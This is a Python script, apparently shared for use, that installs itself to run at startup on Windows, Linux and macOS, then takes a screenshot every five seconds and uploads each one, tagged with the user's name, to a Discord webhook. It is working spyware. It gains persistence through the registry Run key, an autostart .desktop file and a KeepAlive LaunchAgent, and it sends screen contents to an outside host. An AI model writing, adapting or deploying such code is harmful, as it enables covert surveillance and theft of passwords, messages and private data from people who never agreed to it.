import os
import time
import sys
import getpass
import platform
from discord_webhook import DiscordWebhook, DiscordEmbed
from PIL import ImageGrab

user = os.path.expanduser("~")
hook = "Webhook"  #Put your webhook here
username = getpass.getuser()  # Get system username

# Function to configure autostart
def configure_autostart():
    system = platform.system()
    script_path = os.path.abspath(sys.argv[0])

    try:
        if system == "Windows":
            import winreg
            key = winreg.HKEY_CURRENT_USER
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, reg_path, 0, winreg.KEY_ALL_ACCESS) as registry_key:
                winreg.SetValueEx(registry_key, "ScreenshotMonitor", 0, winreg.REG_SZ, f'"{sys.executable}" "{script_path}"')
        
        elif system == "Linux":
            autostart_dir = os.path.join(user, ".config", "autostart")
            desktop_file = os.path.join(autostart_dir, "screenshot_monitor.desktop")
            
            if not os.path.exists(autostart_dir):
                os.makedirs(autostart_dir)
            
            content = f"""[Desktop Entry]
Type=Application
Exec={sys.executable} {script_path}
Hidden=false
NoDisplay=false
Name=Screenshot Monitor
Comment=Automated screenshot capture"""
            
            with open(desktop_file, "w") as f:
                f.write(content)
        
        elif system == "Darwin":
            plist_path = os.path.join(user, "Library", "LaunchAgents", "com.user.screenshotmonitor.plist")
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.user.screenshotmonitor</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""
            
            with open(plist_path, "w") as f:
                f.write(plist_content)
            
            os.system(f"launchctl load {plist_path}")
    
    except Exception as e:
        print(f"Error configuring autostart: {e}")

# set the application to auto start
if not getattr(sys, 'auto_start_configured', False):
    configure_autostart()
    sys.auto_start_configured = True  # Marcar como configurado

def screen():
    while True:
        sss = ImageGrab.grab()
        temp_path = os.path.join(user, "AppData", "Local", "Temp", "ss.png")
        sss.save(temp_path)

        # Embed with username
        webhook = DiscordWebhook(url=hook)
        embed = DiscordEmbed(
            title="🖥 Discord: https://discord.gg/MSukhfr6k3",
            description=f"Usuario: **{username}**\nNueva captura cada 5 segundos",
            color=0x2ECC71
        )
        embed.set_author(
            name="Screenshot Monitor",
            icon_url="https://cdn-icons-png.flaticon.com/512/4712/4712035.png"
        )
        embed.set_image(url="attachment://ss.png")
        embed.set_footer(text=f"🕒 {time.strftime('%d/%m/%Y %H:%M:%S')}")
        
        # Attach image directly to embed :)
        with open(temp_path, "rb") as f:
            webhook.add_file(file=f.read(), filename="ss.png")
        
        webhook.add_embed(embed)
        webhook.execute()

        try:
            os.remove(temp_path)
        except Exception as e:
            print(f"Error eliminando imagen: {e}")

        time.sleep(5)

if __name__ == "__main__":
    screen()